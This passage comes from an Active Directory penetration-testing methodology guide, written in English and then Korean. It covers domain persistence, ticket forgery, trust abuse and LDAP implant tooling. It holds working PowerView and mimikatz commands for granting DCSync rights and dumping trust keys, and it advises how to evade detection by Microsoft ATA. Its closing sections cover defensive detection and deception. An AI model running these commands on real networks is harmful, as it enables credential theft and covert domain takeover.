### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
도메인 trust를 enumerate하는 다른 방법:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2개의 trusted keys**가 있으며, 하나는 _Child --> Parent_용이고 다른 하나는 _Parent_ --> _Child_용입니다.\
> 현재 domain에서 사용 중인 키는 다음으로 확인할 수 있습니다:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

trust를 악용한 SID-History injection으로 Enterprise admin까지 escalate합니다:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)가 어떻게 exploit될 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory (AD) 환경의 forest 전반에 걸친 configuration data의 중앙 저장소 역할을 합니다. 이 data는 forest 내의 모든 Domain Controller (DC)에 replicate되며, writable DC는 Configuration NC의 writable copy를 유지합니다. 이를 exploit하려면 **DC에서 SYSTEM privileges**가 필요하며, 가급적 child DC여야 합니다.

**Link GPO to root DC site**

Configuration NC의 Sites container에는 AD forest 내에 domain-joined된 모든 computer의 site 정보가 들어 있습니다. 어떤 DC에서든 SYSTEM privileges로 동작하면 공격자는 GPO를 root DC site에 link할 수 있습니다. 이 동작은 해당 site에 적용되는 policy를 조작하여 root domain을 잠재적으로 compromise할 수 있습니다.

더 깊은 정보는 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)에 대한 research를 참고할 수 있습니다.

**Compromise any gMSA in the forest**

공격 벡터 중 하나는 domain 내의 privileged gMSA를 target하는 것입니다. gMSA의 password를 계산하는 데 필수적인 KDS Root key는 Configuration NC에 저장됩니다. 어떤 DC에서든 SYSTEM privileges가 있으면 KDS Root key에 접근하여 forest 전반의 어떤 gMSA든 password를 계산할 수 있습니다.

자세한 분석과 단계별 guidance는 다음에서 확인할 수 있습니다:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

보완적인 delegated MSA attack (BadSuccessor – migration attributes 악용):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

이 방법은 새로 생성되는 privileged AD objects를 기다려야 하므로 인내가 필요합니다. SYSTEM privileges가 있으면 attacker는 AD Schema를 수정하여 모든 class에 대해 어떤 user든 완전한 control을 부여할 수 있습니다. 이는 새로 생성되는 AD objects에 대한 unauthorized access와 control로 이어질 수 있습니다.

추가 자료는 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)에서 확인할 수 있습니다.

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability는 Public Key Infrastructure (PKI) objects에 대한 control을 대상으로 하며, forest 내의 어떤 user로도 authentication할 수 있게 해주는 certificate template를 생성하도록 합니다. PKI objects는 Configuration NC에 있으므로, writable child DC를 compromise하면 ESC5 attacks를 실행할 수 있습니다.

이에 대한 더 자세한 내용은 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)에서 읽을 수 있습니다. ADCS가 없는 시나리오에서는 attacker가 필요한 구성 요소를 직접 설정할 수 있으며, 이는 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)에서 설명합니다.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
이 시나리오에서 **your domain is trusted** by 외부 도메인으로부터, 그 도메인에 대해 **undetermined permissions**를 받습니다. 그러면 **당신의 도메인에서 어떤 principals가 외부 도메인에 대해 어떤 access를 가지고 있는지** 찾아야 하며, 그다음 이를 exploit하려고 시도해야 합니다:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
이 시나리오에서 **your domain**은 **다른 domains**의 principal에게 일부 **privileges**를 **trusting**하고 있습니다.

하지만 **domain**이 trusting domain에 의해 **trusted**되면, trusted domain은 **예측 가능한 이름**을 가진 **user**를 만들고, 그 **password**로 **trusted password**를 사용합니다. 즉, trusting domain의 user로 접근해서 trusted domain 안으로 들어가 이를 열거하고 더 많은 privileges로 승격을 시도할 수 있습니다:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain을 침해하는 또 다른 방법은 domain trust의 **반대 방향**으로 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다(이는 그다지 흔하지 않습니다).

trusted domain을 침해하는 또 다른 방법은 **trusted domain의 user가 접근할 수 있는** 머신에서 **RDP**로 로그인할 때까지 기다리는 것입니다. 그런 다음 attacker는 RDP session process에 code를 주입하고, 거기서 **victim의 origin domain**에 접근할 수 있습니다.\
또한 **victim이 자신의 hard drive를 mounted**했다면, **RDP session** process에서 attacker는 hard drive의 **startup folder**에 **backdoors**를 저장할 수 있습니다. 이 기법을 **RDPInception**이라고 합니다.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- forest trust 전반에서 SID history attribute를 악용하는 공격 위험은 SID Filtering으로 완화되며, 이는 모든 inter-forest trusts에서 기본적으로 활성화됩니다. 이는 Microsoft의 입장에 따라 security boundary를 domain이 아니라 forest로 간주하고, intra-forest trusts는 안전하다는 가정에 기반합니다.
- 하지만 주의할 점이 있습니다: SID filtering은 applications와 user access를 방해할 수 있어, 때때로 비활성화되기도 합니다.

### **Selective Authentication:**

- inter-forest trusts에서는 Selective Authentication을 사용하면 두 forest의 users가 자동으로 authenticated되지 않습니다. 대신 trusting domain 또는 forest 내의 domains와 servers에 users가 접근하려면 명시적인 permissions가 필요합니다.
- 이러한 조치가 writable Configuration Naming Context (NC) 또는 trust account에 대한 attacks를 막아주지는 않는다는 점을 알아둘 필요가 있습니다.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)은 bloodyAD 스타일의 LDAP primitives를 x64 Beacon Object Files로 재구현한 것으로, 전부 on-host implant(예: Adaptix C2) 내부에서 실행됩니다. Operators는 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`로 pack을 빌드하고, `ldap.axs`를 로드한 뒤 beacon에서 `ldap <subcommand>`를 호출합니다. 모든 traffic은 현재 logon security context를 통해 LDAP(389)에서 signing/sealing 또는 자동 certificate trust가 적용된 LDAPS(636)로 흐르므로, socks proxies나 disk artifacts가 필요하지 않습니다.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers`는 short names/OU paths를 전체 DNs로 resolve하고 해당 objects를 덤프합니다.
- `get-object`, `get-attribute`, and `get-domaininfo`는 임의의 attributes(security descriptors 포함)와 `rootDSE`의 forest/domain metadata를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd`는 roasting candidates, delegation settings, 그리고 기존 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors를 LDAP에서 직접 노출합니다.
- `get-acl`과 `get-writable --detailed`는 DACL을 파싱해 trustees, rights(GenericAll/WriteDACL/WriteOwner/attribute writes), inheritance를 나열하며, ACL privilege escalation의 즉시 대상이 되는 항목을 제공합니다.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### 상승 및 지속성을 위한 LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`)는 operator가 OU 권한이 존재하는 위치에 새 principals나 machine accounts를 배치할 수 있게 한다. `add-groupmember`, `set-password`, `add-attribute`, `set-attribute`는 write-property 권한이 발견되면 targets를 직접 hijack한다.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync` 같은 ACL 중심 commands는 어떤 AD object든지에 대한 WriteDACL/WriteOwner를 password resets, group membership control, 또는 DCSync replication privileges로 바꾸며, PowerShell/ADSI artifacts를 남기지 않는다. `remove-*` 대응 명령은 injected ACEs를 정리한다.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn`은 즉시 compromised user를 Kerberoastable하게 만든다; `add-asreproastable` (UAC toggle)은 password를 건드리지 않고 AS-REP roasting 대상로 표시한다.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)는 beacon에서 `msDS-AllowedToDelegateTo`, UAC flags, 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 다시 쓰며, constrained/unconstrained/RBCD attack paths를 활성화하고 remote PowerShell이나 RSAT의 필요성을 제거한다.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory`는 privileged SIDs를 controlled principal의 SID history에 주입한다 ([SID-History Injection](sid-history-injection.md) 참조), LDAP/LDAPS만으로 은밀한 access inheritance를 제공한다.
- `move-object`는 computers나 users의 DN/OU를 변경하여, attacker가 이미 delegated rights가 존재하는 OUs로 assets를 옮긴 뒤 `set-password`, `add-groupmember`, 또는 `add-spn`을 악용할 수 있게 한다.
- 범위가 좁은 removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.)는 operator가 credentials나 persistence를 수확한 뒤 빠르게 롤백할 수 있게 하며, telemetry를 최소화한다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**credentials를 보호하는 방법에 대해 더 알아보세요.**](../stealing-credentials/credentials-protections.md)

### **Credential Protection을 위한 Defensive Measures**

- **Domain Admins Restrictions**: Domain Admins는 Domain Controllers에만 login하도록 허용하고, 다른 hosts에서의 사용은 피하는 것이 권장된다.
- **Service Account Privileges**: 보안을 유지하기 위해 services는 Domain Admin (DA) privileges로 실행되어서는 안 된다.
- **Temporal Privilege Limitation**: DA privileges가 필요한 tasks의 경우, 지속 시간을 제한해야 한다. 이는 다음과 같이 달성할 수 있다: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075를 audit한 뒤, DCs/clients에서 LDAP signing과 LDAPS channel binding을 강제하여 LDAP MITM/relay 시도를 차단한다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

일반적인 AD tradecraft를 탐지하고 싶다면, renamed binaries, service names, temp batch files, output paths 같은 **operator-controlled artifacts**에만 의존하지 마라. 정상적인 Windows clients가 [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, WMI traffic을 어떻게 구성하는지 baseline으로 삼고, operator가 `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, `ntlmrelayx.py`를 수정한 뒤에도 남는 **implementation quirks**를 찾아라.

- **High-confidence standalone candidates** (자신의 baseline과 대조해 검증한 후):
- `auth_context_id = 79231 + ctx_id`를 사용하는 authenticated DCE/RPC
- `0xff`로 채워진 DCE/RPC authentication padding
- raw Kerberos `AP-REQ`를 SPNEGO `mechToken`에 직접 넣는 LDAP Kerberos binds
- ASCII처럼 보이는 `ClientGuid` 값을 가진 SMB2/3 negotiate requests
- 비표준 namespace `//./root/cimv2`를 사용하는 WMI `IWbemLevel1Login::NTLMLogin`
- 하드코딩된 Kerberos nonce 값
- **상관관계/스코어링 feature로 더 적합한 것**:
- 희소하거나 중복된 Kerberos etype lists, 비정상적이거나 누락된 `PA-DATA`, 또는 native Windows와 다른 TGS-REQ etype ordering
- version info가 없는 NTLM Type 1 messages 또는 null host names가 있는 Type 3 messages
- SPNEGO 대신 DCE/RPC에 실린 raw NTLMSSP, 누락된 DCE/RPC verification trailers, 또는 SPNEGO/Kerberos OID 불일치
- 같은 host/user/session/time window에서 이런 특성들이 여러 개 보이면, 단일 약한 field보다 훨씬 강력하다
- **독립 경보가 아니라 enrichment로 사용**:
- 기본 filenames, output paths, random service names, temporary batch names, default computer account names, 그리고 tool-specific HTTP/WebDAV/RDP/MSSQL strings
- 이런 값들은 operator가 쉽게 바꿀 수 있으며, cross-protocol cluster가 왜 suspicious한지 설명하는 데 사용하는 것이 가장 좋다
- **운영상 메모**:
- 일부 신호는 decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, 또는 service-side visibility가 필요하다
- 경보로 올리기 전에 Samba/Linux clients, appliances, legacy software와 대조해 검증하라
- baseline에 대한 신뢰도가 쌓이면 detections를 enrichment -> hunting -> alerting 순으로 승격하라

### **Implementing Deception Techniques**

- deception 구현은 decoy users나 computers 같은 traps를 설치하는 것을 포함하며, passwords that do not expire 또는 Trusted for Delegation으로 표시된 기능을 사용할 수 있다. 자세한 접근 방식에는 특정 rights를 가진 users를 만들거나 high privilege groups에 추가하는 것이 포함된다.
- 실용적인 예시는 다음과 같은 tools 사용을 포함한다: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- deception techniques 배포에 대한 더 많은 내용은 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)에서 확인할 수 있다.

### **Identifying Deception**

- **For User Objects**: suspicious indicators에는 atypical ObjectSID, 드문 logons, creation dates, 그리고 낮은 bad password counts가 포함된다.
- **General Indicators**: 잠재적인 decoy objects의 attributes를 실제 objects의 것과 비교하면 불일치를 드러낼 수 있다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 같은 tools가 이런 deceptions 식별에 도움을 줄 수 있다.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection을 피하기 위해 Domain Controllers에서 session enumeration을 하지 않는다.
- **Ticket Impersonation**: ticket creation에 **aes** keys를 사용하면 NTLM으로 downgrade하지 않아서 detection을 회피하는 데 도움이 된다.
- **DCSync Attacks**: Domain Controller가 아닌 곳에서 실행하면 ATA detection을 피할 수 있으므로 권장된다. Domain Controller에서 직접 실행하면 alerts가 트리거된다.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
